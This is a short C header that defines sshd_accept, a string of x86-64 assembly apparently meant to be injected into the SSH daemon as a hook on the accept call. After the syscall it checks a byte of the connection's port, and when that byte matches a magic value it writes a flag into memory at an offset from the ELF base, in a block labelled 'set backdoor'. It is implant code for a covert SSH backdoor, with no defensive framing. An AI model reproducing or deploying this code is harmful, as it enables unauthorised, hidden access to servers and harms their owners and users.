#ifndef SSHD_SCCEPT
#define SSHD_SCCEPT

char sshd_accept[] = "push 0x2b;pop rax;syscall;;push rdi;push rsi;push rdx;push rcx;push r10;push r8;push r9;push rax;;lea r9, %lx;// elf_base;mov al, [rsi + 3];// get connection port;;cmp al, 0x21;jne return_normal;;backdoor:;mov [r9 + %lx], 0x3316;// %lx = rw_gap;// set backdoor;;return_normal:;;pop rax;pop r9;pop r8;pop r10;pop rcx;pop rdx;pop rsi;pop rdi;;ret;";

#endif